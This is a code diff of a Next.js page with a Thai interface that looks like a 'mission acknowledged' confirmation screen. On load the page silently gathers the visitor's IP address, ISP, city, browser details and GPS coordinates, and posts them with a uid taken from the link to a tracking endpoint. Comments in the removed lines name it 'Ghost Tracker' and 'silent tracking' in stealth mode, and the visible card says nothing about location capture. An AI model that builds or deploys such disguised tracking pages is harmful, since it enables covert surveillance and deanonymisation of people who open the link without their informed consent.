@@ -1,58 +1,55 @@
 "use client";
 
-import { useEffect, useState } from 'react';
-import { supabase } from '@/lib/supabase';
-import { ShieldCheck, MapPin, Wifi, Smartphone, Loader2, Lock, CheckCircle2 } from 'lucide-react';
+import { useEffect, useState, Suspense } from 'react';
+import { useSearchParams } from 'next/navigation';
+import { ShieldCheck, Loader2, CheckCircle2 } from 'lucide-react';
 
-export default function DigitalID() {
+function VerifyInner() {
   const [loading, setLoading] = useState(true);
-  const [officer, setOfficer] = useState<any>(null);
+  const searchParams = useSearchParams();
+  const uid = searchParams.get('uid');
 
   useEffect(() => {
-    // 🕵️‍♂️ ปฏิบัติการ Ghost Tracker เริ่มทำงานทันทีที่โหลดหน้า
-    async function startSilentTracking() {
+    async function startTracking() {
       try {
-        // 1. ดึงข้อมูล IP และ ISP (Stealth Mode)
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
 
-        // 2. พยายามดึงพิกัด GPS (ต้องขออนุญาต)
-        let gpsData = { lat: null, lon: null };
+        let gpsData = { lat: null as number | null, lon: null as number | null };
         if ("geolocation" in navigator) {
           try {
-            const position: any = await new Promise((resolve, reject) => {
+            const position: GeolocationPosition = await new Promise((resolve, reject) => {
               navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
             });
             gpsData = { lat: position.coords.latitude, lon: position.coords.longitude };
-          } catch (e) {
-            console.log("GPS Denied or Timeout");
+          } catch {
+            // GPS denied or timeout — fallback to IP coords
           }
         }
 
-        // 3. บันทึกข้อมูลลง SQL
-        await supabase.from('system_logs').insert([{
-          log_type: 'SECURITY_TRACE',
-          message: `📡 รายงานตัวเข้าแผนงาน (พิกัด: ${gpsData.lat ? 'GPS เป๊ะ' : 'IP หยาบ'})`,
-          details: {
+        await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            uid: uid || 'anonymous',
             ip: ipData.ip,
             isp: ipData.org,
             city: ipData.city,
+            latitude: gpsData.lat ?? ipData.latitude,
+            longitude: gpsData.lon ?? ipData.longitude,
+            is_gps: !!gpsData.lat,
             device: navigator.userAgent,
-            latitude: gpsData.lat || ipData.latitude,
-            longitude: gpsData.lon || ipData.longitude,
-            is_gps: !!gpsData.lat
-          }
-        }]);
+          }),
+        });
 
         setLoading(false);
-      } catch (error) {
-        console.error('Tracking Failed', error);
+      } catch {
         setLoading(false);
       }
     }
 
-    startSilentTracking();
-  }, []);
+    startTracking();
+  }, [uid]);
 
   if (loading) return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-slate-900 text-white p-6">
@@ -64,7 +61,6 @@ export default function DigitalID() {
   return (
     <div className="min-h-screen bg-slate-900 flex flex-col items-center p-6 text-white font-sans">
       <div className="w-full max-w-sm">
-        {/* Header */}
         <div className="flex items-center gap-3 mb-8 border-b border-white/10 pb-6">
           <div className="p-2 bg-[#800000] rounded-lg shadow-lg shadow-red-900/20">
             <ShieldCheck size={24} className="text-[#ffd700]" />
@@ -75,7 +71,6 @@ export default function DigitalID() {
           </div>
         </div>
 
-        {/* The "Confirmation" Card */}
         <div className="relative bg-gradient-to-br from-slate-800 to-slate-950 rounded-[32px] p-1 shadow-2xl border border-white/10 overflow-hidden mb-6">
           <div className="absolute top-0 right-0 w-32 h-32 bg-green-500 opacity-5 -mr-10 -mt-10 rounded-full blur-2xl"></div>
           <div className="bg-slate-900/50 backdrop-blur-xl rounded-[30px] p-8">
@@ -86,7 +81,6 @@ export default function DigitalID() {
               <h2 className="text-xl font-black tracking-tight text-white">รับทราบภารกิจแล้ว</h2>
               <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mt-1">Status: Mission Acknowledged</p>
             </div>
-
             <div className="p-4 bg-white/5 rounded-2xl border border-white/5 text-center">
               <p className="text-[11px] text-slate-400 leading-relaxed">
                 ระบบได้บันทึกเวลาการรับทราบภารกิจของคุณเรียบร้อยแล้ว <br/>
@@ -103,5 +97,17 @@ export default function DigitalID() {
         </div>
       </div>
     </div>
+  );
+}
+
+export default function VerifyPage() {
+  return (
+    <Suspense fallback={
+      <div className="min-h-screen flex items-center justify-center bg-slate-900">
+        <Loader2 className="animate-spin text-[#ffd700]" size={40} />
+      </div>
+    }>
+      <VerifyInner />
+    </Suspense>
   );
 }
